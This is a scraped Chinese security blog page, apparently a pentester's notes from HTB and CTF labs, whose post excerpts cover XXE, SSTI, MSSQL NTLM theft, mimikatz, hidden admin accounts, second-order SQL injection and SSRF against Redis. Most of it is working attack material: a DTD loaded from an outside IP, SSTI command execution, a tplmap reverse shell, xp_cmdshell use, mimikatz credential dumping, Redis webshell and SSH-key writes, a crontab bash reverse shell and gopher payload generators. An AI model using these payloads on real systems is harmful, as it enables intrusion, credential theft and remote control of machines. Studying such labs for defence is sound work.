OOB  探测内网端口及服务：
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:3389&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
%dtd; %all;
]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;0x04、攻击内网SSRF+内网服务命令执行实现内网攻击
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/ssrf.php?cmd=xxxxxxx&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;系统命令执行
(PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上时才可用)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;0x05、使用递归实体扩展进行DOS攻击
0x06、XXE漏洞挖掘： 如何判断是否存在XML外部实体攻击?那就是寻找那些接受XML作为输入内容的端点，而有些端点可能并不是那么明显，比如一些仅使用JSON去访问服务的客户端，可以通过修改HTTP的请求或修改Content-Type头部字段等方法，然后看应用程序的响应，看程序是否解析了发送的内容，如果解析了，那么就可能存在XXE攻击漏洞
比如这个案例：https://www.freebuf.com/vuls/167087.html ；通过更改contentn type类型值来fuzz目标是否能够正常响应XML值
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
foo=bar等价于：（一般WAF只会拦截application/x-www-form-urlencoded，通过更改为其他类型如text/xml 或 application/xml可绕过 ）
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;1.文件上传XXE（XML、XLSX，DOCX，PPTX，SVG或任何XML MIME类型格式）
2.传输内容XXE （支持XML）
扩展之Json端点上的XXE：
原始JSON
{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}XML转换(需要添加一个根元素，不然会成为无效的XML文档)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;root&gt;
&lt;search&gt;name&lt;/search&gt;
&lt;value&gt;netspitest&lt;/value&gt;
&lt;/root&gt;以HTB Fulcrum为例：疑似一个API返回一段json信息，但是我们没有能够与API进行交互的方法，只能尝试各种可能（OS[系统命令注入]、sqli、xxe、xpath等）

成功验证XXE



</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/" class="title">调用API绕过杀软添加用户</a>
    <section class="desc">
  创建隐藏账户：
net user tw$ password /add  ###用户名为tw，密码为password的
也可以通过修改注册表实现，需要system权限    如何发现隐藏账户：
通过组查看：
net localgroup administrators 
net localgroup users直接查看注册表，有什么用户一目了然HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过
实现：
微软提供C++实现原型：
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, &quot;netapi32.lib&quot;)

#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;
#include &lt;windows.h&gt; 
#include &lt;lm.h&gt;

int wmain(int argc, wchar_t *argv[])
{
   LPGROUP_USERS_INFO_0 pBuf = NULL;
   DWORD dwLevel = 0;
   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
   DWORD dwEntriesRead = 0;
   DWORD dwTotalEntries = 0;
   NET_API_STATUS nStatus;

   if (argc != 3)
   {
  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);
  exit(1);
   }

   nStatus = NetUserGetGroups(argv[1],
  argv[2],
  dwLevel,
  (LPBYTE*)&amp;pBuf,
  dwPrefMaxLen,
  &amp;dwEntriesRead,
  &amp;dwTotalEntries);

   if (nStatus == NERR_Success)
   {
  LPGROUP_USERS_INFO_0 pTmpBuf;
  DWORD i;
  DWORD dwTotalCount = 0;

  if ((pTmpBuf = pBuf) != NULL)
  {
 fprintf(stderr, &quot;\nGlobal group(s):\n&quot;);

 for (i = 0; i &lt; dwEntriesRead; i++)
 {
assert(pTmpBuf != NULL);

if (pTmpBuf == NULL)
{
   fprintf(stderr, &quot;An access violation has occurred\n&quot;);
   break;
}

wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);

pTmpBuf++;
dwTotalCount++;
 }
  }

  if (dwEntriesRead &lt; dwTotalEntries)
 fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);

  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);
   }
   else
  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);

   if (pBuf != NULL)
  NetApiBufferFree(pBuf);

   return 0;
}NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组
我用C实现效果如下：


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="title">SSTI[服务器模板注入]</a>
    <section class="desc">
  漏洞成因：
用户输入未经过滤就交给引擎处理
将python语句编译成一句话： 
不同类型SSTI paylaod: 
SSTI模板注入常见引擎：

判断是哪种类型SSTI

一个实例：
nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI返回输入内容，已知

检测SSTI

name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）
确定是jinja之后，尝试文件读取和命令执行
读取文件
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
命令执行：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}SSTI注入工具tplmap： 
python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999

</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/MSSQL-NTLM-stealer/" class="title">MSSQL NTLM stealer</a>
    <section class="desc">
  可窃取NTLM的漏洞及利用方式
利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。
如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希
环境说明：https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL SQLi，发现高权限账户但无法读取密码
漏洞利用
默认情况ASP/MSSQL支持堆叠注入：
常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed
猜测是没有权限的问题，想到xp_dirtree外带数据：
payload：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/" class="title">mimikatz抓取密码小记</a>
    <section class="desc">
  1、直接抓取本机：
[1]#privilege::debug          //提升权限[2]#sekurlsa::logonpasswords  //抓取密码
离线破解lsass.dmp
[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来
[2]#privilege::debug          //提升权限
[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp
[4]#sekurlsa::logonpasswords  //抓取密码
踩坑点：
[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)相对路径报错    
解决方法：lsass.dmp要给完整路径，
[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key importmimikatz版本过低
解决方法：使用2.0版本
[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
windows 2012之后明文抓取均会出现这个报错
需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了
（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/" class="title">内网使用smb无文件执行</a>
    <section class="desc">
  创建smb共享
mkdir smb &amp;&amp; cd smb
cp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下
sudo impacket-smbserver share $(pwd) -smb2support -user Twe1ve -password  123456测试：
$pass = convertto-securestring &apos;123456&apos; -AsPlainText -Force
$cred= New-Object System.Management.Automation.PSCredential(&apos;Twe1ve&apos;,$pass)
New-PSDrive -name tw -PSProvider FileSystem -Credential $cred -Root \\10.10.14.61\share
执行：
Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd share:    ##进入共享磁盘

Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行

</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
  </nav>

-->

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.0.2/css/swiper.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.0.2/js/swiper.min.js"></script>
<div class="main-right flex1 flex flex-v">
    <div class="box-content flex1">
        <div class="swiper-container">
            <div class="swiper-wrapper">
                
                    <a title="二次注入详解" alt="二次注入详解" href="/2020/05/19/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="二次注入详解" alt="二次注入详解"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 二次注入详解 &gt;</div>
                            <div class="content flex1">
                                
  0x01、二次注入原理：用户提交的值未被处理（转义或过滤）就存储在数据库中，而开发人员信任来自数据库的数据，未经处理直接在其他功能中调用
0x02、二次注入类型：
用户提交的值未被处理（转义或过滤）就存储在数据库中，未经处理直接在其他功能中调用。（对应案例1和3）
用户输入经过addslashes处理，但是数据库在存储过程吃掉 ‘&#39; ;再次调用时触发paylaod且绕过了addslashes等转义处理 。（对应案例2）

分析几个案例更容易理解；各个案例的源码我会在文末放出
0x03、案例1：直接以目标用户身份身份登录注册时没有经过任何任何处理，payload直接存入数据库；在登录时触发payload以目标（通常为管理员）身份登录
注册时构造payload：
用户名：admin&apos; -- -
密码：password登录处验证代码：
if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;){
// Check if username is empty
if(empty(trim($_POST[&quot;username&quot;]))){
    $username_err = &apos;Please enter username.&apos;;
} else{
    $username = trim($_POST[&quot;username&quot;]);
}

// Check if password is empty
if(empty(trim($_POST[&apos;password&apos;]))){
    $password_err = &apos;Please enter your password.&apos;;
} else{
    $password = trim($_POST[&apos;password&apos;]);
}
####对用户输入没有进行特殊处理

if(empty(trim($_POST[&quot;username&quot;]))){
$username_err = &apos;Please enter username.&apos;;} else{
    $username = trim($_POST[&quot;username&quot;]);
  }

// Check if password is empty
if(empty(trim($_POST[&apos;password&apos;]))){
    $password_err = &apos;Please enter your password.&apos;;
} else{
    $password = trim($_POST[&apos;password&apos;]);
}

// Validate credentials
if(empty($username_err) &amp;&amp; empty($password_err)){
    // Prepare a select statement
    $sql = &quot;SELECT username, password FROM users WHERE username = ?&quot;;
####此时将用户名和密码从数据库中取出----&gt;触发构造的payload  
##SQL语句为：SELECT username, password FROM users WHERE username = &apos;admin&apos; -- - 
##也就是取出admin账户的账户密码来做验证；所以后边的代码可以不用看都没事   
    if($stmt = mysqli_prepare($link, $sql)){
        // Bind variables to the prepared statement as parameters
        mysqli_stmt_bind_param($stmt, &quot;s&quot;, $param_username);。
###在传递给mysqli_prepare()的SQL语句中为参数标记绑定变量为用户输入
        // Set parameters
        $param_username = $username;

        // Attempt to execute the prepared statement
        if(mysqli_stmt_execute($stmt)){
            // Store result
            mysqli_stmt_store_result($stmt);     
###获取$sql执行结果              
            // Check if username exists, if yes then verify password
            if(mysqli_stmt_num_rows($stmt) == 1){     ####结果集中行数等于1,即用户存在               
                // Bind result variables
                mysqli_stmt_bind_result($stmt, $username, $hashed_password); ###将结果集中的列绑定到变量。
                if(mysqli_stmt_fetch($stmt)){  ###从准备好的语句中获取结果到mysqli_stmt_bind_result()绑定的变量中 。
                    if(password_verify($password, $hashed_password)){
                        /* Password is correct, so start a new session and
                        save the username to the session */
                        session_start();
                        $_SESSION[&apos;username&apos;] = $username;      
                        header(&quot;location: home.php&quot;);
                    } else{
                        // Display an error message if password is not valid
                        $password_err = &apos;The password you entered was not valid.&apos;;
                    }
                }
            } else{
                // Display an error message if username doesn&apos;t exist
                $username_err = &apos;No account found with that username.&apos;;
            }
        } else{
            echo &quot;Oops! Something went wrong. Please try again later.&quot;;
        }
    }0x04、案例2：经典案例sqli-labs-24，更改管理账户密码在注册时构造payload
用户名： admin&apos; #
密码：password注册时对用户输入的注册用户名进行特殊字符转义
$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;
$pass= mysql_escape_string($_POST[&apos;password&apos;]);
$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);
....
###此时payload被转义为admin\&apos;\ #
...
$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;
mysql_query($sql) or die(&apos;Error Creating your user account,  : &apos;.mysql_error());
...
##存入数据库后payload被还原为: admin&apos; #也就是转义会被数据库吃掉，在被引用时还原为我们的paylaod；原理如下图

登录时同样对用户输入进行特殊字符转义（没有进行特殊处理的话即会变成案例1）
function sqllogin(){
   $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
   $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
   $sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
   $res = mysql_query($sql) or die(&apos;You tried to be real smart, Try harder!!!! :( &apos;);
   $row = mysql_fetch_row($res);
//print_r($row) ;
   if ($row[1]) {
return $row[1];
   } else {
  return 0;
   }
}简单验证一下注册和登录流程：

更改密码：
$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
####直接获取当前用户名进行密码更新
###此时SQL语句： UPDATE users SET PASSWORD=&apos;password&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos;
$res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);
........至此完成二次注入对目标用户密码的修改
0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入） 以HTB的NightMare靶机为例：
注册帐户名 ： ’
登录进入发现SQL报错

初步验证注入点 ，在BurpSuit分别抓注册和登录包发送到Repeater；来回切换
&apos; -- -  仍然报错；寻找正确闭合方式
&quot; -- - 回显SQL报错信息
&apos;) -- -无SQL报错信息
1&apos;) or 1=1 #无SQL报错信息
&apos;) order by 1000#   回显SQL报错信息
&apos;) order by 1#  无SQL报错信息
.....
###最终验证出列值为 2 使用SQLMAP进行POST二次注入；编写对应tamper脚本简易思路：（难点是注册之后基于新cookie进行身份验证）我在这里找到了对应的技巧：将HTTP请求发送到主页并检索新的cookie值；将sqlmap生成HTTP请求替换Cookie值 
https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/
https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5
注册：register username位置填入 payload ;密码固定password=123456    
post_data = { ‘username’:payload, ‘password’:’tw123’,’register’:’Register’ }
然后是获取用户注册成功后返回的cookie并执行替换；使用–second-url  http://10.10.10.66/notes.php在index之后请求notes.php验证结果
response = s.post(“http://10.10.10.66/register.php&quot;, data=post_data)
php_cookie = re.search(‘PHPSESSID=(.*?);’, response.headers[‘Set-Cookie’]).group(1)
最终tamper：
#!/usr/bin/env python
import reimport requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
pass

def create_account(payload):
s = requests.Session()

post_data = { &apos;user&apos;:payload, &apos;pass&apos;:&apos;tw123&apos;, &apos;register&apos;:&apos;Register&apos; }
proxies = { &apos;http&apos;:&apos;http://127.0.0.1:8080&apos; }
response = s.post(&quot;http://10.10.10.66/register.php&quot;, data=post_data, proxies=proxies)
php_cookie = re.search(&apos;PHPSESSID=(.*?);&apos;, response.headers[&apos;Set-Cookie&apos;]).group(1)

return &quot;PHPSESSID={0}&quot;.format(php_cookie)

def tamper(payload, **kwargs):
headers = kwargs.get(&quot;headers&quot;, {})
headers[&quot;Cookie&quot;] = create_account(payload)
return payloadsqlmap语句：
sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080

注意点：

post包中密码需要和tamper脚本中一致
去掉login.req中的cookie那一行
使用代理的话需要开启Burpsuit

这里就直接贴最终的paylaod吧：
sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080 --dump -D sysadmin --no-cast####需要–no-cast 参数
0x06、总结：主要利用点还是网站对用户输入没有进行处理（这也是二次注入比较少的原因之一）；但是二次注入工具难以检测，所以危害还是很大的
参考链接：
http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/
http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html
https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>May 19, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="SSRF+Redis" alt="SSRF+Redis" href="/2020/05/19/SSRF-Redis/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="SSRF+Redis" alt="SSRF+Redis"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; SSRF+Redis &gt;</div>
                            <div class="content flex1">
                                
  猪猪侠SSRF议题
形成SSRF的代码示例：
&lt;?php
function curl($url){  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
}
$url = $_GET[&apos;url&apos;];
curl($url);
?&gt;SSRF绕过限制：
利用短网址

xip.io  –&gt; 127.0.0.1.xip.io

@符号绕过 –&gt; www.baidu.com@127.0.0.1 —&gt;访问127.0.0.1（利用解析问题绕过）

dns rebinding ： http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/

更改ip地址写法，如十六进制 http://127.0.0.1 —&gt;http://0177.0.0.1

协议层请求绕过  —&gt; 请求带有事先设计跳转的页面file ftp（302跳转）
 



Redis未授权绝对路径写webshell：
flushall
set 1 ‘‘ 
config set dir /var/www/html
config set dbfilename shell.php
save

写ssh公钥：
ssh-keygen -t rsa ###生成公钥
flushall
set 1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDw2hZflPUjUwuzH6yIgXRiZtBa4L9I6nFqaTH7OELXd4ErUUm4ucBcQBXJqD9wilAepPDKqVohWITXQdLUzyi7ICHrhgVELjk3JRdJ6aJFYJEtXpTi1wJYCaV1Jb9WidF7Jfb2B7rp/TWI0HOORNQJCmA04iFXRAaER1cQTq0ZW+/iB03uTrr5rbmgg/MlwJFa4vSgGSskI2xJ2NOpz4LLBQaybs8VBgr7IqaBcNl55qiZoWcILCVxSW0IyNiPVrLc1nI/oi2sOrFoaGSFFZp35ne9TKzeYyZl5LY3enX1eepNGW1MMYf5NdCcDHjvjcYVa20jqpvD6jDFhOjCfk/nMt1FTRB79LiZ/KKNkdUUZzauTqyyYjZsWKZ1+CcKjk7nVsfFINI8Ap/sGd4J/LXw5QaepKTx+DTmom7c67bYhnFheOQVWusmtghYiC/1UYIyLOayrgLiwt5xIsb5KjgMN29PJpf7zxpUV/TgbgkYLFzNt2CP5u5aWyXdRDyA/K0=
config set dir /root/.ssh/
config set dbfilename authorized_keys
save

写contrab定时任务反弹shell：

flushall
set 1 ‘\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1\n\n’
config set dir /var/spool/cron/
config set dbfilename root
save

SSRF+Redis利用
http、https 内网服务探测
file-读取文本
file:///etc/passwd
….
dict 用于泄露软件安装版本信息探测端口、操作redis（但由于空格问题，无法正常写入文件）

dict://127.0.0.1:6379/infodict://127.0.0.1:6379/getuserdict://127.0.0.1:6379/flushall
gopher 万能协议反弹shell：(redis利用需要REST编码)
Gopher协议中需要对paylaod进行编码；空格用%0a,回车换行使用%0d%0a，参数之间的分隔符也用URL编码转换Redis RESP格式脚本https://xz.aliyun.com/t/5665#toc-4根据需求更改payload、filename、path的值
import urllib
protocol=&quot;gopher://&quot;
ip=&quot;127.0.0.1&quot;
port=&quot;6379&quot;
payload=&quot;\n\n&lt;?php system($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
filename=&quot;shell.php&quot;
path=&quot;/var/www/html&quot;
passwd=&quot;&quot;
cmd=[&quot;flushall&quot;,
 &quot;set 1 {}&quot;.format(payload.replace(&quot; &quot;,&quot;${IFS}&quot;)),
 &quot;config set dir {}&quot;.format(path),
 &quot;config set dbfilename {}&quot;.format(filename),
 &quot;save&quot;
 ]
if passwd:
cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
def redis_format(arr):
CRLF=&quot;\r\n&quot;
redis_arr = arr.split(&quot; &quot;)
cmd=&quot;&quot;
cmd+=&quot;*&quot;+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
cmd+=CRLF
return cmd
if __name__==&quot;__main__&quot;:
for x in cmd:
payload += urllib.quote(redis_format(x))
print payloadubuntu无法写crontab反弹shell： https://xz.aliyun.com/t/1800

SSRF利用redis之不换行
FLUSHALL
config set dir /var/www/html/
set a1 ZY%16%0E%16F
set a2 ffffff
BITOP XOR payload a1 a2
append payload eval($_GET[c]);%3f&gt;
config set dbfilename cmd.php
save

Gopher有如下几点问题

PHP的curl默认不跟随302跳转
curl7.43gopher协议存在%00截断的BUG，v7.45以上可用
file_get_contents()的SSRF，gopher协议不能使用URLencode
file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败

SSRF 打内网之POST请求(CTF题目)http://152.136.63.75:8016/index.php?url=    —&gt;存在SSRF
目录扫描发现 http://152.136.63.75:8016/webshe11231231231.php 页面
view-source:http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php   —&gt;file读取webshell源码
&lt;?php

$serverList = array(
&quot;127.0.0.1&quot;
);
$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];
foreach ($serverList as $host) {
if ($ip === $host) {
if ((!empty($_POST[&apos;admin&apos;])) and $_POST[&apos;admin&apos;] === &apos;h1admin&apos;) {
@eval($_POST[&apos;hacker&apos;]);
} else {
die(&quot;You aren&apos;t admin!&quot;);
}
} else {
die(&apos;This is webshell&apos;);
}
}GET请求的话可以直接利用，但这里需要POST请求才能利用，需要进一步处理—-&gt;使用Gopher协议并对POST payload包进行编码，编码脚本如下：
exp = &apos;&apos;&apos;\
POST /webshe11231231231.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
admin=h1admin&amp;hacker=system(&apos;cat fl1234aaaaaggggg.php&apos;);
&apos;&apos;&apos;
import urllib
tmp = urllib.quote(exp)
new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)
result = &quot;_&quot;+urllib.quote(new)
print result更改命令的时候Content-Length的值也需要修改根据Gopher协议，编码的第一个字符无效，所以用第一位放个  “_”

如上图所示，所以需要两次编码
生成paylaod：
kali@kali:~$ python exp.py
_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A最后exp：
